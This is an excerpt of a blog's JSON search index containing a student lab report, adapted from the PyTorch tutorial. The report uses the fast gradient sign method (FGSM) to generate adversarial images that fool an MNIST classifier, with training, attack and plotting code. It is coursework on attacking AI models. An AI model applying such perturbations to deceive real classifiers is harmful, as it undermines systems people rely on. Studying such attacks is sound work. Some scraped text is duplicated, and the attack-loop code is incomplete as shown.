num、学习率方面有着较好的经验总结。","categories":[{"name":"学校作业","slug":"学校作业","permalink":"https://snowman12137.github.io/categories/%E5%AD%A6%E6%A0%A1%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://snowman12137.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"学校作业","slug":"学校作业","permalink":"https://snowman12137.github.io/tags/%E5%AD%A6%E6%A0%A1%E4%BD%9C%E4%B8%9A/"}],"author":"Sn0wma1n"},{"title":"大三网络安全智能终端实验一","slug":"大三网络安全智能终端实验一","date":"2023-05-04T12:09:16.000Z","updated":"2024-02-03T17:04:32.365Z","comments":true,"path":"2023/05/04/大三网络安全智能终端实验一/","link":"","permalink":"https://snowman12137.github.io/2023/05/04/%E5%A4%A7%E4%B8%89%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%99%BA%E8%83%BD%E7%BB%88%E7%AB%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/","excerpt":"","text":"西安电子科技大学网信院 智能终端实验实验报告（一）班级：2018XX学号：20009XXXX日期：2023.4.24一、实验摘要研究不断推动机器学习模型更快，更精确，更有效。然而，设计和训练模型的一个经常被忽视的方面是安全性和鲁棒性，特别是在面对希望欺骗模型的对手时。向图像添加不可察觉的扰动可以导致完全不同的模型性能。我们将通过一个图像分类器的例子来探讨这个主题。具体来说，我们将使用第一个和最流行的攻击方法之一，快速梯度符号攻击(FGSM) ，以欺骗 MNIST 分类器。（摘自https://pytorch.org/tutorials/beginner/ fgsm_tutorial.htm l?highlight&#x3D;a dversarial% 20example%20generation） 二、实验内容a) 实验思路#### 简述 有许多类别的对抗性攻击，每种攻击都有不同的目标和对攻击者知识的假设。然而，一般来说，总体目标是向输入数据添加最少量的扰动，从而导致所需的错误分类。有几种假设攻击者的知识，其中两个是: 白盒和黑盒。白盒攻击假设攻击者对模型有完整的知识和访问权限，包括体系结构、输入、输出和权重。黑盒攻击假设攻击者只能访问模型的输入和输出，并且对底层架构或权重一无所知。还有几种类型的目标，包括错误分类和源&#x2F;目标错误分类。错误分类的目标意味着对手只希望输出分类是错误的，而不关心新的分类是什么。源&#x2F;目标错误分类意味着对手想要更改原来属于特定源类的图像，以便将其归类为特定目标类。在这种情况下，FGSM 攻击是以错误分类为目标的白盒攻击。有了这些背景信息，我们现在可以详细讨论这次攻击了。 快速梯度 原理简述快速梯度符号攻击（FGSA），是通过基于相同的反向传播梯度来调整输入数据使损失最大化，简言之，共计使用了丢失的梯度值w.r.t输入数据，然后调整输入使数据丢失最大化。下图是实现的例子： 可以看出x是正常“熊猫”的原始输入图像，y是真实的图片输入， θ表示模型参数，J(θ,x,y)是损失函数，∇x​J(θ,x,y)是攻击将梯度反向传播回要计算的输入数据。然后，它通过一个小步骤调整输入数据，如0.007倍的sign(∇x​J(θ,x,y))添加到里面会最大化损失函数。然后得到扰动图像x’，然后被目标网络错误地归类为“长臂猿”，而它显然仍然是一只“熊猫”。 b) 实现过程1.输入只有三个输入 Epsilons-运行时使用的 epsilon 值列表。在列表中保留0很重要，因为它表示原始测试集上的模型性能。此外，直观地，我们期望更大的 ε，更明显的扰动，但更有效的攻击方面的退化模型的准确性。因为这里的数据范围是 [ 0 , 1 ] [0,1] ，ε 值不应超过1。 Pretrain _ model-path加载预训练的模型 Use _ CUDA-boolean 标志来使用 CUDA，如果需要的话。 123epsilons = [0, .05, .1, .15, .2, .25, .3]pretrained_model = &quot;mnist_cnn.pt&quot;use_cuda=True 2.模型建立a)训练模型我們用了一層 convolution layer 和 pooling layer 來擷取 image 的 feature，之後要把這些 feature map 成 10 個 node 的 output（因為有 10 個 class 要 predict），所以用 flatten 把 feature 集中成 vector 後，再用 fully-connected layer map 到 output layer。b 是 batch size，一次 train 幾張 image。 12345678910111213141516class Net(nn.Module): def __init__(self): super(Net, self).__init__() self.conv = nn.Conv2d(1, 32, 3) self.dropout = nn.Dropout2d(0.25) self.fc = nn.Linear(5408, 10) def forward(self, x): x = self.conv(x) x = F.relu(x) x = F.max_pool2d(x, 2) x = self.dropout(x) x = torch.flatten(x, 1) x = self.fc(x) output = F.log_softmax(x, dim=1) return output b)训练函数123456789101112131415161718192021222324def train(model, train_loader, optimizer, epochs, log_interval): model.train() for epoch in range(1, epochs + 1): for batch_idx, (data, target) in enumerate(train_loader): # Clear gradient optimizer.zero_grad() # Forward propagation output = model(data) # Negative log likelihood loss loss = F.nll_loss(output, target) # Back propagation loss.backward() # Parameter update optimizer.step() # Log training info if batch_idx % log_interval == 0: print(&#x27;Train Epoch: &#123;&#125; [&#123;&#125;/&#123;&#125; (&#123;:.0f&#125;%)]\\tLoss: &#123;:.6f&#125;&#x27;.format( epoch, batch_idx * len(data), len(train_loader.dataset), 100. * batch_idx / len(train_loader), loss.item())) c)训练中的测试1234567891011121314151617181920def test(model, test_loader): model.eval() test_loss = 0 correct = 0 with torch.no_grad(): # disable gradient calculation for efficiency for data, target in test_loader: # Prediction output = model(data) # Compute loss &amp; accuracy test_loss += F.nll_loss(output, target, reduction=&#x27;sum&#x27;).item() pred = output.argmax(dim=1, keepdim=True) correct += pred.eq(target.view_as(pred)).sum().item() test_loss /= len(test_loader.dataset) # Log testing info print(&#x27;\\nTest set: Average loss: &#123;:.4f&#125;, Accuracy: &#123;&#125;/&#123;&#125; (&#123;:.0f&#125;%)\\n&#x27;.format( test_loss, correct, len(test_loader.dataset), 100. * correct / len(test_loader.dataset))) d)训练的主函数（把模型保存）12345678910111213141516171819202122232425262728293031323334def main(): # Training settings BATCH_SIZE = 64 EPOCHS = 2 LOG_INTERVAL = 10 # Define image transform transform=transforms.Compose([ transforms.ToTensor(), transforms.Normalize((0.1307,), (0.3081,)) # mean and std for the MNIST training set ]) # Load dataset train_dataset = datasets.MNIST(&#x27;./data&#x27;, train=True, download=True, transform=transform) test_dataset = datasets.MNIST(&#x27;./data&#x27;, train=False, transform=transform) train_loader = torch.utils.data.DataLoader(train_dataset, batch_size=BATCH_SIZE) test_loader = torch.utils.data.DataLoader(test_dataset, batch_size=BATCH_SIZE) # Create network &amp; optimizer model = Net() optimizer = optim.Adam(model.parameters()) # Train train(model, train_loader, optimizer, EPOCHS, LOG_INTERVAL) # Save and load model torch.save(model.state_dict(), &quot;mnist_cnn.pt&quot;) model = Net() model.load_state_dict(torch.load(&quot;mnist_cnn.pt&quot;)) # Test test(model, test_loader) 训练参数储存 e)训练结果 3.FGSM攻击a)模型加载加载模型 1234567891011121314151617181920# MNIST Test dataset and dataloader declarationtransform = transforms.Compose([ transforms.ToTensor(), ])train_dataset = datasets.MNIST(&#x27;./data&#x27;, train=True, download=True, transform=transform)test_loader = torch.utils.data.DataLoader(train_dataset,batch_size=1, shuffle=True)# Define what device we are usingprint(&quot;CUDA Available: &quot;,torch.cuda.is_available())device = torch.device(&quot;cuda&quot; if (use_cuda and torch.cuda.is_available()) else &quot;cpu&quot;)# Initialize the networkmodel = Net().to(device)# Load the pretrained modelmodel.load_state_dict(torch.load(&quot;mnist_cnn.pt&quot;, map_location=&#x27;cpu&#x27;))# Set the model in evaluation mode. In this case this is for the Dropout layersmodel.eval() b)攻击函数创建现在，我们可以通过扰动原始输入来定义创建对抗性示例的函数。Fgsm 攻击函数有三个输入，图像是原始清晰图像(xx) ，ε 是像素级扰动量(εε) ，data _ grad 是损失的梯度，输入图像(∇xJ(θ,x,y))。然后，该函数创建扰动图像$$perturbed_image&#x3D;image+epsilon∗sign(data_grad)&#x3D;x+ϵ∗sign(∇x​ J(θ,x,y))$$ 12345678910# FGSM attack codedef fgsm_attack(image, epsilon, data_grad): # Collect the element-wise sign of the data gradient sign_data_grad = data_grad.sign() # Create the perturbed image by adjusting each pixel of the input image perturbed_image = image + epsilon*sign_data_grad # Adding clipping to maintain [0,1] range perturbed_image = torch.clamp(perturbed_image, 0, 1) # Return the perturbed image return perturbed_image c)开始攻击12345678accuracies = []examples = []# Run test for each epsilonfor eps in epsilons: acc, ex = test(model, device, test_loader, eps) accuracies.append(acc) examples.append(ex) d) 实验结果截图第一个结果是精度对 ε 图。正如前面提到的，随着 ε 的增加，我们预计测试的准确性会降低。这是因为更大的 ε 意味着我们在将损失最大化的方向上迈出了更大的一步。注意曲线中的趋势不是线性的，即使 ε 值是线性间隔的。例如，ε &#x3D; 0.05 ε &#x3D; 0.05的准确性仅比 ε &#x3D; 0ε &#x3D; 0低约4% ，但是 ε &#x3D; 0.2 ε &#x3D; 0.2的准确性比 ε &#x3D; 0.15 ε &#x3D; 0.15低25% 。另外，请注意模型的精度在 ε &#x3D; 0.25 ε &#x3D; 0.25和 ε &#x3D; 0.3 ε &#x3D; 0.3之间的随机精度。 打印上述数据 12345678910111213141516# Plot several examples of adversarial samples at each epsilon cnt = 0 plt.figure(figsize=(8,10)) for i in range(len(epsilons)): for j in range(len(examples[i])): cnt += 1 plt.subplot(len(epsilons),len(examples[0]),cnt) plt.xticks([], []) plt.yticks([], []) if j == 0: plt.ylabel(&quot;Eps: &#123;&#125;&quot;.format(epsilons[i]), fontsize=14) orig,adv,ex = examples[i][j] plt.title(&quot;&#123;&#125; -&gt; &#123;&#125;&quot;.format(orig, adv)) plt.imshow(ex, cmap=&quot;gray&quot;) plt.tight_layout() plt.show() 打印几个代表性的例子 三、实验结果分析分析从结果来看，随着 ε 的增加，测试精度下降，但扰动变得更容易察觉。实际上，在攻击者必须考虑的精确度下降和可感知性之间存在权衡。在这里，我们展示了一些成功的对抗例子在每个 ε 值。图的每一行显示不同的 ε 值。第一行是 ε &#x3D; 0 ε &#x3D; 0的例子，它表示原始的“干净”图像，没有扰动。每张图片的标题都显示了“原始分类-&gt; 敌对分类”注意，当 ε &#x3D; 0.15 ε &#x3D; 0.15时，扰动开始变得明显，当 ε &#x3D; 0.3 ε &#x3D; 0.3时，扰动非常明显。然而，在所有情况下，人们仍然能够识别正确的类别，尽管增加了噪音。","categories":[{"name":"学校作业","slug":"学校作业","permalink":"https://snowman12137.github.io/categories/%E5%AD%A6%E6%A0%A1%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"学校作业","slug":"学校作业","permalink":"https://snowman12137.github.io/tags/%E5%AD%A6%E6%A0%A1%E4%BD%9C%E4%B8%9A/"}]}],"categories":[{"name":"科学上网","slug":"科学上网","permalink":"https://snowman12137.github.io/categories/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"},{"name":"其他","slug":"科学上网/其他","permalink":"https://snowman12137.github.io/categories/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/%E5%85%B6%E4%BB%96/"},{"name":"Docker","slug":"Docker","permalink":"https://snowman12137.github.io/categories/Docker/"},{"name":"生物计算机科学","slug":"生物计算机科学","permalink":"https://snowman12137.github.io/categories/%E7%94%9F%E7%89%A9%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"},{"name":"前端学习","slug":"前端学习","permalink":"https://snowman12137.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"MAGs云分析","slug":"MAGs云分析","permalink":"https://snowman12137.github.io/categories/MAGs%E4%BA%91%E5%88%86%E6%9E%90/"},{"name":"生物计算机科学","slug":"MAGs云分析/生物计算机科学","permalink":"https://snowman12137.github.io/categories/MAGs%E4%BA%91%E5%88%86%E6%9E%90/%E7%94%9F%E7%89%A9%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"},{"name":"其他","slug":"其他","permalink":"https://snowman12137.github.io/categories/%E5%85%B6%E4%BB%96/"},{"name":"Electron-Vue-WebRTC客户端学习","slug":"Electron-Vue-WebRTC客户端学习","permalink":"https://snowman12137.github.io/categories/Electron-Vue-WebRTC%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"CTF网络攻防","slug":"CTF网络攻防","permalink":"https://snowman12137.github.io/categories/CTF%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"},{"name":"SGX","slug":"SGX","permalink":"https://snowman12137.github.io/categories/SGX/"},{"name":"CTF入门","slug":"CTF入门","permalink":"https://snowman12137.github.io/categories/CTF%E5%85%A5%E9%97%A8/"},{"name":"学校作业","slug":"学校作业","permalink":"https://snowman12137.github.io/categories/%E5%AD%A6%E6%A0%A1%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"科学上网","slug":"科学上网","permalink":"https://snowman12137.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"},{"name":"Docker","slug":"Docker","permalink":"https://snowman12137.github.io/tags/Docker/"},{"name":"前端学习,VUE","slug":"前端学习-VUE","permalink":"https://snowman12137.github.io/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0-VUE/"},{"name":"metaGEM","slug":"metaGEM","permalink":"https://snowman12137.github.io/tags/metaGEM/"},{"name":"博客问题","slug":"博客问题","permalink":"https://snowman12137.github.io/tags/%E5%8D%9A%E5%AE%A2%E9%97%AE%E9%A2%98/"},{"name":"Nodejs学习","slug":"Nodejs学习","permalink":"https://snowman12137.github.io/tags/Nodejs%E5%AD%A6%E4%B9%A0/"},{"name":"CTF网络攻防","slug":"CTF网络攻防","permalink":"https://snowman12137.github.io/tags/CTF%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"},{"name":"SGX","slug":"SGX","permalink":"https://snowman12137.github.io/tags/SGX/"},{"name":"Linux","slug":"Linux","permalink":"https://snowman12137.github.io/tags/Linux/"},{"name":"现代密码学","slug":"现代密码学","permalink":"https://snowman12137.github.io/tags/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"机器学习","slug":"机器学习","permalink":"https://snowman12137.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"学校作业","slug":"学校作业","permalink":"https://snowman12137.github.io/tags/%E5%AD%A6%E6%A0%A1%E4%BD%9C%E4%B8%9A/"}]}